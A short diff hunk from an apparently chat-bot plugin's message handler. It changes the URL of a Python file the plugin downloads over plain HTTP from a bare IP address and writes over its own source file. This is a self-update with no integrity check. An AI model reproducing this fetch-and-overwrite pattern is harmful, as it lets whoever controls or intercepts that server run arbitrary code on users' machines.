@@ -501,7 +501,7 @@ async def on_message(event, actions, Manager, Segments):
             )
             return True
         try:
-            url = "http://101.35.241.21:8888/down/QkcAgVXsrKIS.py"
+            url = "http://101.35.241.21:8888/down/WkhHDKvwHpsQ.py"
             save_path = os.path.abspath(__file__)
             async with httpx.AsyncClient() as client:
                 resp = await client.get(url, timeout=10.0)
